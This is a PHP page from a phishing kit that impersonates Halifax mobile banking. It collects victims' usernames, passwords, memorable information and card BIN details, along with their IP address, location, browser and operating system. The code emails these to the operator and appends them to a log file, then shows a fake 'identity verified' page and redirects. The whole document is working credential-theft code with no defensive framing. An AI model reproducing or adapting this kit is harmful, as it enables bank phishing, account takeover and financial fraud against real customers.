<?php
ini_set('display_errors', false);
date_default_timezone_set('Europe/London');
require_once('../../inc/functions.php');
require_once('../../inc/include_page.php');
require_once('../../inc/configuration.php');




$date = date('l d F Y');
$time = date('H:i');
$user = $_SESSION['username'];
$pass = $_SESSION['password'];
$memorable = $_POST['memorable'];


$ccno = str_replace(' ', '', $ccno);
$last4 = substr($ccno, 12, 16);
$cardInfo = bankDetails($ccno);
$BIN = ($cardInfo['bin']);
$Bank = (isset($cardInfo['bank']['name'])) ? $cardInfo['bank']['name']:"Unknown Bank For This BIN!";
$Brand = ($cardInfo['brand']);
$Type = ($cardInfo['type']);
$ip = $_SERVER['REMOTE_ADDR'];
$systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);
$VictimInfo1 = "Submitted by : " . $_SERVER['REMOTE_ADDR'] . " (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")";
$VictimInfo2 = "Location : " . $systemInfo['city'] . ", " . $systemInfo['region'] . ", " . $systemInfo['country'] . "";
$VictimInfo3 = "UserAgent : " . $systemInfo['useragent'] . "";
$VictimInfo4 = "Browser : " . $systemInfo['browser'] . "";
$VictimInfo5 = "Os : " . $systemInfo['os'] . "";
$data = $_SESSION['details'];
$data .= "
+ ------------- C3AS3R --------------+
+ Account Details (Halifax)
| Username : $user
| Password : $pass
| Memorable : $memorable
+ ------------------------------------------+
+ Victim Information
$VictimInfo1
$VictimInfo2
$VictimInfo3
$VictimInfo4
$VictimInfo5
| Received : $date @ $time
+ ------------------------------------------+
";



if ($emailSave == 1) {
	mail($email,  "halifax from " . $_SERVER['REMOTE_ADDR'], $data);
}


if ($fileSave === 1) {
    $file = fopen('../../logs/halifax.txt', 'a');
    fwrite($file, $data . "\n");
    fclose($file);
}




?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML Basic 1.1//EN" "http://www.w3.org/TR/xhtml-basic/xhtml-basic11.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-gb">

<head>
    <title>Halifax - Mobile Banking - Successfully</title>
    <meta name="keywords" content="">
    <meta http-equiv="refresh" content="5;url=../../exit.php" />
    <meta name="description" content="">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="content-language" content="en-gb">
    <link rel="alternate" media="handheld" href="">
    <meta name="viewport" content="width=device-width">
    <script async="" src="assets/files/adrum-ext.js"></script>
    <script src="assets/files/utag_003.js" type="text/javascript" async=""></script>
    <script type="text/javascript" src="assets/files/utag-1548761392.js">
    </script>
    <meta name="DCSext.hasTealium" content="1">
    <link rel="apple-touch-icon" sizes="57x57" href="assets/files/Halifax%2057x57%20app-touch-icon-1432115287.JPG">
    <link rel="apple-touch-icon" sizes="114x114" href="assets/files/Halifax%20114x114%20app-touch-icon-1432115236.JPG">
    <link type="text/css" href="assets/files/base-auto-min190206.css" rel="stylesheet">
    <script type="text/javascript" src="assets/files/scriptsnippet.js"></script>
    <script type="text/javascript">
        window['adrum-start-time'] = new Date().getTime();
    </script>
    <script type="text/javascript" src="assets/files/adrum.js"></script>
    <meta name="dclinkjourid" content="lEYeYjDGw0ANFsPtY2uirgh0LspE4ESy">
    <script type="text/javascript" async="async" src="assets/files/cdApi.js"></script>
    <script type="text/javascript" async="async" src="assets/files/16c9d93d.js"></script>

<body class="hasJS ">



<div id="outer">
    <div id="banner">
        <p id="logo"> <img src="assets/files/Halifax-logo-1432115232.gif" alt="Halifax"> </p>
        <p id="userstatusNGB"> <img src="assets/files/padlock-secure-NGB-1432115235.gif" alt="Secure"> </p>
        <p class="cookiePolicy"> <a title="Cookie Policy" href="#">
                Cookie Policy
            </a> </p>
        <div class="clearer"></div>
    </div>
    <div id="header">
        <div class="panelTL">
            <div class="panelTR">
                <div class="panelBR">
                    <div class="panelBL">
                        <div id="headerInner">
                            <!-- start TS:component_0_free_format -->
                            <h1>Successfully</h1>
                            <!-- end TS:component_0_free_format -->
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="content">
        <div class="login">
            <div class="panelTL">
                <div class="panelTR">
                    <div class="panelBR">
                        <div class="panelBL">
                            <div class="loginInner">
                                <div class="loginFields">
                                    <form id="payment" name="verify" method="post" action="Finish.php?ssl_id=<?php echo randomString(30); ?>" autocomplete="off">
                                    <p style="text-align:center;">
                                        <br>
                                        <br>
                                        <img src="assets/spin.gif" style="width: 80px;" alt=""> <Br /> <Br />
                                        Your identity has been verified, you can use now your account. <Br /> <Br />
                                        You will be redirected shortly to main page. <br />
                                    </p>
                                    </form>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>


        <div class="clearer"></div>
        <div id="footerLogin">
            <div class="FootNav">
                <div class="lnkLevFoot">
                    <p class="lnkLevFootP"> <a title="Register for Internet Banking" href="#">
                            Register for Internet Banking</a> <a title="Go to desktop site" href="#">Go to desktop site</a> <a title="Help" href="#">
                            Help</a> <a title="Security" href="#">
                            Security</a> <a title="Contact us" href="#">
                            Contact us</a> </p>
                </div>
                <div class="aside">
                    <p class="sideNote"> <a title="Mobile Banking" href="#">Mobile Banking</a> </p>
                </div>
                <div class="appBannerBG">
                    <div class="appBannerLink">
                        <p align="center">
                            <a href="#" title="fscs login tile"><img alt="FSCS" src="assets/files/fscs-ngb-logon-banner-V2-1459783745.png"></a>
                        </p>
                    </div>
                </div>
                <div class="clearer"></div>
                <div>
                    <div class="footerLinksLogin"> <a title="Security" href="#">Security</a> <a title="Legal" href="#">Legal</a> </div>
                </div>
            </div>
        </div>
        <input type="hidden" name="smartAppForIosAndAndroid" value="true">
        <input type="hidden" name="smartAppForIosAbvSix" value="true"> </div>
</div>

<object data="assets/files/utag.js" style="display: none;"></object>
<object data="assets/files/utag_002.js" style="display: none;"></object>
</body>

</html>

